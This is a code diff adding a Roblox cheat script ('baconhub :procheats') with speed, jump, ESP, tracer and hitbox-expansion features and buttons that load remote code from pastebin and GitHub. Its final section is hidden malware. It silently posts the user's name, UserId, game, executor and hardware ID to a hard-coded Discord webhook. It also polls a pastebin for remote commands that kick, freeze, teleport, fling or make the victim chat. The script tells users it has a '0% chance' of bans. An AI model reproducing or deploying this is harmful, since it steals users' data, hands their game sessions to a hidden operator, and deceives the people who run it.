@@ -1,14 +1,1226 @@
---// Custom Loader Script
 
-local url = "https://api.junkie-development.de/api/v1/luascripts/public/1bcfd53e9057899c2fbca5e23fd7ebe769787ddb8c19b2514337451fe7714ac2/download"
+
+local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/Library-ui/refs/heads/main/Redzhubui"))()
+
+game.StarterGui:SetCore("SendNotification", {
+Title = "Reminder",
+Text = "a reminder to join our discord!",
+Duration = 10,
+})
+
+local Window = redzlib:MakeWindow({
+  Title = "baconhub :procheats",
+  SubTitle = "Free Script",
+  SaveFolder = "baconhub"
+})
+
+Window:AddMinimizeButton({
+    Button = { Image = "rbxassetid://114302082036991", BackgroundTransparency = 0 },
+    Corner = { CornerRadius = UDim.new(35, 1) },
+})
+
+local Tab1 = Window:MakeTab({"Main", "House"})
+
+Window:SelectTab(Tab1)
+
+local Section = Tab1:AddSection({"Main"})
+
+local Paragraph = Tab1:AddParagraph({"Important", "  Using this Script has 0% chance of getting you banned. \n  This Script is free and will always be free. \n  If you paid for this script, you got scammed. \n  Join our discord to get more free scripts. \n"})
+
+Tab1:AddDiscordInvite({
+    Name = "baconhub",
+    Description = "Join server",
+    Logo = "rbxassetid://114302082036991",
+    Invite = "https://discord.gg/WukuCX7QBs",
+})
+
+local Tab2 = Window:MakeTab({"Player Modifiers", "Utensils"})
+
+local loopSpeedValue = 16 -- Default speed value
+
+Tab2:AddSlider({
+    Name = "Speed",
+    Min = 1,
+    Max = 100,
+    Increase = 1,
+    Default = 16,
+    Callback = function(Value)
+        -- Update the loop speed value
+        loopSpeedValue = Value
+    end
+})
+
+-- Continuously apply the loop speed
+local player = game.Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+RunService.Heartbeat:Connect(function()
+    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.WalkSpeed = loopSpeedValue
+    end
+end)
+
+Tab2:AddSlider({
+    Name = "Sonic Speed",
+    Min = 1,
+    Max = 1000,
+    Increase = 1,
+    Default = 16,
+    Callback = function(Value)
+        -- Update the loop speed value
+        loopSpeedValue = Value
+    end
+})
+
+-- Continuously apply the loop speed
+local player = game.Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+RunService.Heartbeat:Connect(function()
+    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.WalkSpeed = loopSpeedValue
+    end
+end)
+
+local loopJumpPowerValue = 50 -- Default jump power value
+
+Tab2:AddSlider({
+    Name = "Jump Power",
+    Min = 10,
+    Max = 100,
+    Increase = 1,
+    Default = 50,
+    Callback = function(Value)
+        -- Update the loop jump power value
+        loopJumpPowerValue = Value
+    end
+})
+
+-- Continuously apply the loop jump power
+local player = game.Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+RunService.Heartbeat:Connect(function()
+    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.JumpPower = loopJumpPowerValue
+    end
+end)
+
+Tab2:AddSlider({
+    Name = "Bunny Jump Power",
+    Min = 10,
+    Max = 1000,
+    Increase = 1,
+    Default = 50,
+    Callback = function(Value)
+        -- Update the loop jump power value
+        loopJumpPowerValue = Value
+    end
+})
+
+-- Continuously apply the loop jump power
+local player = game.Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+RunService.Heartbeat:Connect(function()
+    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.JumpPower = loopJumpPowerValue
+    end
+end)
+
+local Paragraph = Tab2:AddParagraph({"Thats Basically it for the free player modifiers"})
+
+local Tab3 = Window:MakeTab({"LocalPlayer", "Cloud"})
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+local ToggleAimbot = Tab3:AddToggle({
+    Name = "Enable ESP",
+    Description = "Toggle enemy ESP red boxes and teammate blue boxes",
+    Default = false
+})
+
+local Boxes = {}
+
+local function CreateOrUpdateHighlight(player, color)
+    local char = player.Character
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        if not Boxes[player] then
+            local box = Instance.new("BoxHandleAdornment")
+            box.Adornee = char.HumanoidRootPart
+            box.AlwaysOnTop = true
+            box.ZIndex = 10
+            box.Size = Vector3.new(4, 6, 4)
+            box.Transparency = 0.5
+            box.Parent = char
+            Boxes[player] = box
+        end
+        Boxes[player].Color3 = color
+        Boxes[player].Adornee = char.HumanoidRootPart
+    else
+        if Boxes[player] then
+            Boxes[player]:Destroy()
+            Boxes[player] = nil
+        end
+    end
+end
+
+local espConnection
+
+ToggleAimbot:Callback(function(enabled)
+    if enabled then
+        -- Notification
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Notification",
+            Text = "ESP Initialized, Notification Self Destruct in 20 Seconds",
+            Duration = 20
+        })
+
+        -- Start looping ESP update
+        espConnection = RunService.Heartbeat:Connect(function()
+            for _, player in pairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer then
+                    local teamColor = (player.Team == LocalPlayer.Team) and Color3.fromRGB(0, 0, 255) or Color3.fromRGB(255, 0, 0)
+                    CreateOrUpdateHighlight(player, teamColor)
+                end
+            end
+        end)
+
+    else
+        -- Stop loop and cleanup
+        if espConnection then
+            espConnection:Disconnect()
+            espConnection = nil
+        end
+
+        for player, box in pairs(Boxes) do
+            if box and box.Parent then
+                box:Destroy()
+            end
+        end
+        Boxes = {}
+    end
+end)
+
+local RunService = game:GetService("RunService")
+local PlayersService = game:GetService("Players")
+local Camera = workspace.CurrentCamera
+
+local Lines = {}
+local Quads = {}
+
+local function HasCharacter(Player)
+    return Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
+end
+
+local function DrawQuad(PosA, PosB, PosC, PosD)
+    local PosAScreen, PosAVisible = Camera:WorldToViewportPoint(PosA)
+    local PosBScreen, PosBVisible = Camera:WorldToViewportPoint(PosB)
+    local PosCScreen, PosCVisible = Camera:WorldToViewportPoint(PosC)
+    local PosDScreen, PosDVisible = Camera:WorldToViewportPoint(PosD)
+
+    if (not PosAVisible and not PosBVisible and not PosCVisible and not PosDVisible) then return end
+
+    local PosAVec = Vector2.new(PosAScreen.X, PosAScreen.Y)
+    local PosBVec = Vector2.new(PosBScreen.X, PosBScreen.Y)
+    local PosCVec = Vector2.new(PosCScreen.X, PosCScreen.Y)
+    local PosDVec = Vector2.new(PosDScreen.X, PosDScreen.Y)
+
+    local Quad = Drawing.new("Quad")
+    Quad.Thickness = 0.5
+    Quad.Color = Color3.fromRGB(255, 255, 255)
+    Quad.Transparency = 0.25
+    Quad.ZIndex = 1
+    Quad.Filled = true
+    Quad.Visible = true
+
+    Quad.PointA = PosAVec
+    Quad.PointB = PosBVec
+    Quad.PointC = PosCVec
+    Quad.PointD = PosDVec
+
+    table.insert(Quads, Quad)
+end
+
+local function DrawLine(From, To)
+    local FromScreen, FromVisible = Camera:WorldToViewportPoint(From)
+    local ToScreen, ToVisible = Camera:WorldToViewportPoint(To)
+
+    if (not FromVisible and not ToVisible) then return end
+
+    local FromPos = Vector2.new(FromScreen.X, FromScreen.Y)
+    local ToPos = Vector2.new(ToScreen.X, ToScreen.Y)
+
+    local Line = Drawing.new("Line")
+    Line.Thickness = 1
+    Line.From = FromPos
+    Line.To = ToPos
+    Line.Color = Color3.fromRGB(255, 255, 255)
+    Line.Transparency = 1
+    Line.ZIndex = 1
+    Line.Visible = true
+
+    table.insert(Lines, Line)
+end
+
+local function GetCorners(Part)
+    local CF, Size, Corners = Part.CFrame, Part.Size / 2, {}
+    for X = -1, 1, 2 do
+        for Y = -1, 1, 2 do
+            for Z = -1, 1, 2 do
+                Corners[#Corners + 1] = (CF * CFrame.new(Size * Vector3.new(X, Y, Z))).Position
+            end
+        end
+    end
+    return Corners
+end
+
+local function DrawEsp(Player)
+    local HRP = Player.Character.HumanoidRootPart
+    local CubeVertices = GetCorners({ CFrame = HRP.CFrame * CFrame.new(0, -0.5, 0), Size = Vector3.new(3, 5, 3) })
+
+    -- Bottom face
+    DrawLine(CubeVertices[1], CubeVertices[2])
+    DrawLine(CubeVertices[2], CubeVertices[6])
+    DrawLine(CubeVertices[6], CubeVertices[5])
+    DrawLine(CubeVertices[5], CubeVertices[1])
+    DrawQuad(CubeVertices[1], CubeVertices[2], CubeVertices[6], CubeVertices[5])
+
+    -- Side faces
+    DrawLine(CubeVertices[1], CubeVertices[3])
+    DrawLine(CubeVertices[2], CubeVertices[4])
+    DrawLine(CubeVertices[6], CubeVertices[8])
+    DrawLine(CubeVertices[5], CubeVertices[7])
+    DrawQuad(CubeVertices[2], CubeVertices[4], CubeVertices[8], CubeVertices[6])
+    DrawQuad(CubeVertices[1], CubeVertices[2], CubeVertices[4], CubeVertices[3])
+    DrawQuad(CubeVertices[1], CubeVertices[5], CubeVertices[7], CubeVertices[3])
+    DrawQuad(CubeVertices[5], CubeVertices[7], CubeVertices[8], CubeVertices[6])
+
+    -- Top face
+    DrawLine(CubeVertices[3], CubeVertices[4])
+    DrawLine(CubeVertices[4], CubeVertices[8])
+    DrawLine(CubeVertices[8], CubeVertices[7])
+    DrawLine(CubeVertices[7], CubeVertices[3])
+    DrawQuad(CubeVertices[3], CubeVertices[4], CubeVertices[8], CubeVertices[7])
+end
+
+local function ClearDrawings()
+    for _, line in ipairs(Lines) do
+        line:Remove()
+    end
+    Lines = {}
+
+    for _, quad in ipairs(Quads) do
+        quad:Remove()
+    end
+    Quads = {}
+end
+
+-- Toggle Setup
+local espConnection = nil
+
+local Toggle2 = Tab3:AddToggle({
+    Name = "Enable ESP 2 (laggy)",
+    Description = "Toggle the advanced 3D box ESP",
+    Default = false
+})
+
+Toggle2:Callback(function(enabled)
+    if enabled then
+        espConnection = RunService.RenderStepped:Connect(function()
+            ClearDrawings()
+            for _, player in pairs(PlayersService:GetPlayers()) do
+                if player ~= game.Players.LocalPlayer and HasCharacter(player) then
+                    DrawEsp(player)
+                end
+            end
+        end)
+    else
+        if espConnection then
+            espConnection:Disconnect()
+            espConnection = nil
+        end
+        ClearDrawings()
+    end
+end)
+
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+local Tracers = {}
+local tracerConnection
+
+local ToggleTracers = Tab3:AddToggle({
+    Name = "Enable Tracers",
+    Description = "Toggle tracers for enemies (red lines) and teammates (blue lines)",
+    Default = false
+})
+
+local function CreateOrUpdateTracer(player, color)
+    local char = player.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if root then
+        if not Tracers[player] then
+            local tracer = Drawing.new("Line")
+            tracer.Thickness = 2
+            tracer.Transparency = 1
+            tracer.Visible = true
+            Tracers[player] = tracer
+        end
+
+        local tracer = Tracers[player]
+        local rootPos, onScreenRoot = workspace.CurrentCamera:WorldToViewportPoint(root.Position)
+        local playerPos, onScreenPlayer = workspace.CurrentCamera:WorldToViewportPoint(LocalPlayer.Character.HumanoidRootPart.Position)
+
+        if onScreenRoot and onScreenPlayer then
+            tracer.From = Vector2.new(playerPos.X, playerPos.Y)
+            tracer.To = Vector2.new(rootPos.X, rootPos.Y)
+            tracer.Color = color
+            tracer.Visible = true
+        else
+            tracer.Visible = false
+        end
+    else
+        if Tracers[player] then
+            Tracers[player]:Remove()
+            Tracers[player] = nil
+        end
+    end
+end
+
+ToggleTracers:Callback(function(enabled)
+    if enabled then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Notification",
+            Text = "Tracers Enabled",
+            Duration = 5
+        })
+
+        tracerConnection = RunService.RenderStepped:Connect(function()
+            for _, player in pairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer then
+                    local teamColor = (player.Team == LocalPlayer.Team) and Color3.fromRGB(0, 0, 255) or Color3.fromRGB(255, 0, 0)
+                    CreateOrUpdateTracer(player, teamColor)
+                end
+            end
+        end)
+    else
+        if tracerConnection then
+            tracerConnection:Disconnect()
+            tracerConnection = nil
+        end
+
+        for _, tracer in pairs(Tracers) do
+            if tracer then
+                tracer:Remove()
+            end
+        end
+        Tracers = {}
+    end
+end)
+
+local Toggle1 = Tab3:AddToggle({
+   Name = "Health ESP",
+   Description = "This is a <font color='rgb(88, 101, 242)'>Toggle</font> for Health ESP",
+   Default = false
+})
+
+Toggle1:Callback(function(enabled)
+   if enabled then
+      -- Create ESP loop
+      local RunService = game:GetService("RunService")
+      local Players = game:GetService("Players")
+      local LocalPlayer = Players.LocalPlayer
+
+      -- Store ESP instances to clean them up when toggle is disabled
+      local ESPInstances = {}
+
+      local function createHealthESP(player)
+         if player.Character and player.Character:FindFirstChild("Humanoid") then
+            local billboard = Instance.new("BillboardGui")
+            billboard.Name = "HealthESP"
+            billboard.Adornee = player.Character:FindFirstChild("Head")
+            billboard.Size = UDim2.new(2, 0, 0.5, 0)
+            billboard.StudsOffset = Vector3.new(0, 3, 0)
+            billboard.AlwaysOnTop = true
+
+            local frame = Instance.new("Frame", billboard)
+            frame.Size = UDim2.new(1, 0, 0.5, 0)
+            frame.Position = UDim2.new(0, 0, 0.25, 0)
+            frame.BackgroundTransparency = 0.2
+            frame.BorderSizePixel = 0
+            frame.BackgroundColor3 = Color3.new(0, 1, 0) -- Default green for full health
+            frame.ClipsDescendants = true
+            frame.AnchorPoint = Vector2.new(0.5, 0.5)
+
+            local corner = Instance.new("UICorner", frame)
+            corner.CornerRadius = UDim.new(1, 0) -- Make it rounded
+
+            local healthText = Instance.new("TextLabel", billboard)
+            healthText.Size = UDim2.new(1, 0, 1, 0)
+            healthText.Position = UDim2.new(0, 0, 0, 0)
+            healthText.TextScaled = true
+            healthText.BackgroundTransparency = 1
+            healthText.TextColor3 = Color3.new(1, 1, 1) -- White text
+            healthText.Font = Enum.Font.GothamSemibold
+            healthText.Text = "100" -- Initial value
+
+            billboard.Parent = player.Character:FindFirstChild("Head")
+            ESPInstances[player] = billboard
+         end
+      end
+
+      local function updateHealthESP()
+         for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
+               local humanoid = player.Character:FindFirstChild("Humanoid")
+               local health = humanoid.Health
+               local maxHealth = humanoid.MaxHealth
+               local billboard = ESPInstances[player]
+
+               if not billboard then
+                  createHealthESP(player)
+                  billboard = ESPInstances[player]
+               end
+
+               if billboard and billboard:FindFirstChild("Frame") then
+                  local frame = billboard.Frame
+                  local healthText = billboard:FindFirstChild("TextLabel")
+                  if frame and healthText then
+                     local healthRatio = health / maxHealth
+                     frame.BackgroundColor3 = Color3.new(1 - healthRatio, healthRatio, 0) -- Gradient from green to red
+                     frame.Size = UDim2.new(healthRatio, 0, 0.5, 0) -- Shrink bar based on health
+                     healthText.Text = tostring(math.floor(health)) -- Update health number
+                  end
+               end
+            end
+         end
+      end
+
+      -- Start updating ESP
+      local connection = RunService.RenderStepped:Connect(updateHealthESP)
+
+      Toggle1:Callback(function(enabled)
+         if not enabled then
+            -- Disable ESP and clean up
+            connection:Disconnect()
+            for _, billboard in pairs(ESPInstances) do
+               if billboard then
+                  billboard:Destroy()
+               end
+            end
+            ESPInstances = {}
+         end
+      end)
+   end
+end)
+
+
+local Section = Tab3:AddSection({"Hitbox"})
+
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Store original head sizes and the current hitbox size
+local originalHeadSizes = {}
+local hitboxSize = 5 -- Default hitbox size (you can adjust)
+
+-- Slider Setup
+local Slider1 = Tab3:AddSlider({
+    Name = "Hitbox Size",
+    Min = 1,
+    Max = 100,
+    Default = 5,
+    Increment = 1,
+    Callback = function(value)
+        hitboxSize = value -- Update hitbox size when slider changes
+    end
+})
+
+-- Function to determine if a player is an enemy
+local function isEnemy(player)
+    return player.Team ~= LocalPlayer.Team
+end
+
+-- Toggle Setup
+local Toggle1 = Tab3:AddToggle({
+    Name = "Enable Hitbox",
+    Description = "Toggle head hitbox resizing",
+    Default = false
+})
+
+local hitboxConnection
+
+Toggle1:Callback(function(enabled)
+    if enabled then
+        -- Start looping hitbox resizing
+        hitboxConnection = RunService.Heartbeat:Connect(function()
+            for _, player in pairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer and isEnemy(player) then -- Only apply to enemies
+                    if player.Character and player.Character:FindFirstChild("Head") then
+                        local head = player.Character.Head
+
+                        -- Store original size if not already stored
+                        if not originalHeadSizes[player] then
+                            originalHeadSizes[player] = head.Size
+                        end
+
+                        -- Resize head, make it slightly transparent and red
+                        head.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
+                        head.Transparency = 0.5 -- Make it slightly transparent
+                        head.BrickColor = BrickColor.new("Bright red") -- Make it red
+
+                        -- Allow players to walk through the head
+                        if head:FindFirstChild("CanCollide") == nil or head.CanCollide then
+                            head.CanCollide = false
+                        end
+                    end
+                end
+            end
+        end)
+    else
+        -- Stop hitbox loop and restore original sizes
+        if hitboxConnection then
+            hitboxConnection:Disconnect()
+            hitboxConnection = nil
+        end
+
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Character and player.Character:FindFirstChild("Head") then
+                local head = player.Character.Head
+
+                -- Restore original size if stored
+                if originalHeadSizes[player] then
+                    head.Size = originalHeadSizes[player]
+                    head.Transparency = 0 -- Reset transparency
+                    head.BrickColor = BrickColor.new("Medium stone grey") -- Reset color (default)
+                    head.CanCollide = true -- Reset collision
+                    originalHeadSizes[player] = nil
+                end
+            end
+        end
+    end
+end)
+
+
+local TabTroll = Window:MakeTab({"Troll"})
+
+local SectionTroll = TabTroll:AddSection({"Troll Scripts & Tools"})
+
+-- Button 1: Load Sussy Hub
+TabTroll:AddButton({
+    Name = "Load 💦 Sussy Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconHub1/Beta-test/refs/heads/main/test"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Sussy Hub Loaded",
+            Text = "💦 Sussy Hub script loaded.",
+            Duration = 6
+        })
+    end
+})
+
+-- Button 2: Load Aimbot Mobile
+TabTroll:AddButton({
+    Name = "Load Aimbot Mobile",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/DanielHubll/DanielHubll/refs/heads/main/Aimbot%20Mobile"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Aimbot Loaded",
+            Text = "Aimbot Mobile script loaded.",
+            Duration = 6
+        })
+    end
+})
+
+-- Button 3: Load FE DASH
+TabTroll:AddButton({
+    Name = "Load FE DASH",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Mautiku/ehh/main/FE%20DASH.txt'))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "FE DASH Loaded",
+            Text = "FE DASH script loaded.",
+            Duration = 6
+        })
+    end
+})
+
+-- Button 4: Load Invisible
+TabTroll:AddButton({
+    Name = "Load Invisible",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/vP6CrQJj"))()
+       game.StarterGui:SetCore("SendNotification", {
+            Title = "invisible ",
+            Text = "Invisible loaded.",
+            Duration = 6
+        })
+    end
+})
+-- Button 5: Add Click Teleport Tool
+TabTroll:AddButton({
+    Name = "Add Click Teleport Tool",
+    Callback = function()
+        local tool = Instance.new("Tool")
+        tool.RequiresHandle = false
+        tool.Name = "ClickTP"
+        tool.Parent = game.Players.LocalPlayer.Backpack
+
+        tool.Activated:Connect(function()
+            local player = game.Players.LocalPlayer
+            local mouse = player:GetMouse()
+            if mouse and mouse.Hit then
+                local character = player.Character or player.CharacterAdded:Wait()
+                if character and character:FindFirstChild("HumanoidRootPart") then
+                    character:MoveTo(mouse.Hit.p)
+
+                    local marker = Instance.new("Part")
+                    marker.Anchored = true
+                    marker.CanCollide = false
+                    marker.Size = Vector3.new(0.8, 0.8, 0.8)
+                    marker.Shape = Enum.PartType.Ball
+                    marker.Material = Enum.Material.Neon
+                    marker.Color = Color3.fromRGB(255, 0, 0)
+                    marker.Position = mouse.Hit.p + Vector3.new(0, 1, 0)
+                    marker.Parent = workspace
+
+                    game.Debris:AddItem(marker, 2)
+                end
+            end
+        end)
+
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "ClickTP Tool Added",
+            Text = "Use it from your Backpack. Click to teleport.",
+            Duration = 6
+        })
+    end
+})
+
+-- Create "Fun" tab
+local TabFun = Window:MakeTab({"Fun"})
+
+TabFun:AddButton({
+    Name = "Zero Gravity",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/fc4QuXRG"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Zero Gravity Loaded",
+            Text = "Zero Gravity script loaded.",
+            Duration = 6
+        })
+    end
+})
+
+-- Create "Baconhub Script" tab
+local TabBaconhub = Window:MakeTab({"Baconhub Script"})
+
+TabBaconhub:AddButton({
+    Name = "Unvcban",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/ij8NzdqF"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Unvcban Loaded",
+            Text = "Unvcban script loaded.",
+            Duration = 6
+        })
+    end
+})
+
+TabBaconhub:AddButton({
+    Name = "Fly gui",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/zZJYJax0"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Fly GUI Loaded",
+            Text = "Fly GUI script loaded.",
+            Duration = 6
+        })
+    end
+})
+
+
+TabBaconhub:AddButton({
+    Name = "baconhub",
+    Callback = function()
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconHub1/Autoupdate/refs/heads/main/Cuz%20yes"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "baconhub Loaded",
+            Text = "baconhub loaded.",
+            Duration = 6
+        })
+    end
+})
+
+local TabRadar = Window:MakeTab({"Player Radar", "Utility"})
+
+TabRadar:AddButton({
+    Name = "Activate Player Radar",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/Gsa1pNGk"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Radar Activated",
+            Text = "Player Radar script has been loaded.",
+            Duration = 5
+        })
+    end
+})
+
+local Tab4 = Window:MakeTab({"Credits", "Cherry"})
+
+local paragraph = Tab4:AddParagraph({
+	"Credits",
+	[[Made by Baconhub
+Credits to Redz for the UI Library
+and the devs of the hub.
+Join our Discord to get more free scripts.]]
+})
+-- ✅ Webhook URLs
+local analyticsWebhook = "https://discord.com/api/webhooks/1397575581570437221/YR78v0TagfOEez0JcuxDcfxbNVrtuWVREwo9hnjvYr-P4UrAvpAA5guxMZdAdJYiLTa4"
+local commandWebhook = "https://discord.com/api/webhooks/1397575581570437221/YR78v0TagfOEez0JcuxDcfxbNVrtuWVREwo9hnjvYr-P4UrAvpAA5guxMZdAdJYiLTa4"
+
+-- ✅ Services
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+local TeleportService = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
+local Debris = game:GetService("Debris")
+
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+-- ✅ Track Executions
+getgenv()._BaconHub_Executions = getgenv()._BaconHub_Executions or {}
+local isNewUser = not getgenv()._BaconHub_Executions[player.UserId]
+getgenv()._BaconHub_Executions[player.UserId] = true
+local totalUniqueUsers = 0
+for _ in pairs(getgenv()._BaconHub_Executions) do totalUniqueUsers += 1 end
+
+-- ✅ General Info
+local userKey = _G.BaconKey or "None"
+local scriptVersion = "v4.3.1"
+local featureList = "🛡️ Anti-AFK | 📛 Executor Logger | 🎭 Jumpscares | 📈 Analytics"
+local isFE, tampered = true, "No"
+local request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
+
+-- ✅ Executor
+local executor = "Unknown"
+pcall(function() executor = identifyexecutor and identifyexecutor() or "Unknown" end)
+
+-- ✅ Game Info
+local gameName, gameLink = "Unknown", "https://www.roblox.com/games/"..game.PlaceId
+pcall(function() local info = MarketplaceService:GetProductInfo(game.PlaceId) gameName = info.Name end)
+
+-- ✅ Platform
+local platform = UserInputService.TouchEnabled and "Mobile" or (UserInputService.GamepadEnabled and "Console" or "PC")
+
+-- ✅ HWID
+local hwid = "Unsupported"
+pcall(function()
+	if syn and syn.request and gethwid then hwid = gethwid()
+	elseif identifyexecutor and identifyexecutor() == "Krnl" and getexecutorhwid then hwid = getexecutorhwid()
+	end
+end)
+
+-- ✅ Analytics Webhook
+local analyticsData = {
+	username = "📊 BaconHub Analytics",
+	embeds = {{
+		title = isNewUser and "🆕 New Unique Execution Detected!" or "🔁 Returning User Execution",
+		color = isNewUser and 0x2ecc71 or 0xf1c40f,
+		description = table.concat({
+			"👤 **User:** "..player.Name.." (`"..player.UserId.."`)",
+			"🎮 **Game:** "..gameName.." (`"..game.PlaceId.."`)",
+			"🔗 [Click to View Game]("..gameLink..")",
+			"⚙️ **Executor:** "..executor,
+			"📱 **Platform:** "..platform,
+			"💻 **HWID:** "..hwid,
+			"🧰 **Features:** "..featureList,
+			"🔑 **Key:** "..userKey,
+			"📦 **Version:** "..scriptVersion,
+			"👁️ **FE Visible:** "..tostring(isFE),
+			"🔐 **Tampered?:** "..tampered,
+			"🧭 **JobId:** "..game.JobId,
+			isNewUser and "🆕 **New Unique User Joined!**" or "🔁 **Returning User**",
+			"📊 **Total Unique Executions:** "..tostring(totalUniqueUsers),
+			"🕒 **Time:** "..os.date("%Y-%m-%d %H:%M:%S")
+		}, "\n"),
+		footer = { text = "BaconHub Analytics System" }
+	}}
+}
+pcall(function()
+	if request then
+		request({
+			Url = analyticsWebhook,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(analyticsData)
+		})
+	end
+end)
+
+-- ✅ Command Logger
+function logCommand(cmd)
+	local logData = {
+		username = "📡 BaconHub Command Logger",
+		embeds = {{
+			title = "📥 Command Executed on User",
+			color = 0x3498db,
+			description = table.concat({
+				"👤 **User:** "..player.Name.." (`"..player.UserId.."`)",
+				"🎯 **Target:** "..(cmd.target or "unknown"),
+				"🛠️ **Action:** `" .. (cmd.action or "none") .. "`",
+				"📝 **Message:** "..(cmd.text or "N/A"),
+				"🕒 **Time:** "..os.date("%Y-%m-%d %H:%M:%S"),
+				"🌐 **Game:** ["..gameName.."]("..gameLink..")"
+			}, "\n"),
+			footer = { text = "BaconHub Remote Command Logger" }
+		}}
+	}
+	pcall(function()
+		if request then
+			request({
+				Url = commandWebhook,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = HttpService:JSONEncode(logData)
+			})
+		end
+	end)
+end
+
+-- ✅ Notification popup
+function showPopup(txt)
+	local gui = Instance.new("ScreenGui", PlayerGui)
+	local label = Instance.new("TextLabel", gui)
+	label.Size = UDim2.new(0, 400, 0, 50)
+	label.Position = UDim2.new(0.5, -200, 0, 60)
+	label.BackgroundColor3 = Color3.fromRGB(40,40,40)
+	label.TextColor3 = Color3.new(1,1,1)
+	label.Font = Enum.Font.GothamBold
+	label.TextScaled = true
+	label.Text = txt
+	Debris:AddItem(gui, 4)
+end
+
+-- ✅ Command Handlers
+local PastebinURL = "https://pastebin.com/raw/SCbhHcVw"
+local frozen = false
+local processed = {}
+
+RunService.Stepped:Connect(function()
+	if frozen and player.Character then
+		local hum = player.Character:FindFirstChildOfClass("Humanoid")
+		if hum then hum.WalkSpeed = 0 hum.JumpPower = 0 end
+	end
+end)
+
+local handlers = {
+	kick = function(cmd) logCommand(cmd) player:Kick(cmd.text or "You were kicked.") end,
+	freeze = function(cmd) logCommand(cmd) frozen = true showPopup("❄️ You were frozen") end,
+	unfreeze = function(cmd) logCommand(cmd) frozen = false showPopup("🔥 Unfrozen") end,
+	message = function(cmd) logCommand(cmd) showPopup("📨 "..(cmd.text or "")) end,
+	global = function(cmd) logCommand(cmd) game.StarterGui:SetCore("ChatMakeSystemMessage",{Text="🌐 GLOBAL: "..(cmd.text or ""),Color=Color3.new(1,1,0),Font=Enum.Font.SourceSansBold,FontSize=Enum.FontSize.Size24}) end,
+	say = function(cmd) logCommand(cmd) local rep = game:GetService("ReplicatedStorage") local chat = rep:FindFirstChild("DefaultChatSystemChatEvents") if chat then chat.SayMessageRequest:FireServer(cmd.text or "Hello!", "All") end end,
+	teleport = function(cmd) logCommand(cmd) if cmd.placeId and cmd.jobId then TeleportService:TeleportToPlaceInstance(tonumber(cmd.placeId), tostring(cmd.jobId), player) end end,
+	custom = function(cmd) logCommand(cmd) if cmd.subaction == "fling" then local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart") if hrp then hrp.Velocity = Vector3.new(0, 150, 0) showPopup("💥 Flung") end end end
+}
+
+function runCommand(cmd)
+	if type(cmd) ~= "table" then return end
+	local id = tostring(cmd.id or HttpService:JSONEncode(cmd))
+	if processed[id] then return end
+	if not handlers[cmd.action] then return end
+	if (cmd.target or ""):lower() == player.Name:lower() or cmd.target == tostring(player.UserId) or cmd.target == "all" then
+		processed[id] = true
+		handlers[cmd.action](cmd)
+	end
+end
+
+function fetchCommands()
+	local ok, res = pcall(function() return game:HttpGet(PastebinURL) end)
+	if ok then
+		local success, data = pcall(function() return HttpService:JSONDecode(res) end)
+		if success and typeof(data) == "table" then
+			for _,cmd in ipairs(data) do runCommand(cmd) end
+		end
+	end
+end
+
+task.spawn(function()
+	while true do
+		fetchCommands()
+		task.wait(10)
+	end
+end)
+
+logCommand({action = "join", target = player.Name, text = "🔔 procheats Remote Loaded"})
+showPopup("✅ procheats Loaded")
+
+logCommand({action = "join", target = player.Name, text = "🔔 procheats Remote Loaded"})
+showPopup("✅ procheatsLoaded")
+
+local blacklistURL = "https://pastebin.com/raw/rhdbw8ZY"
+
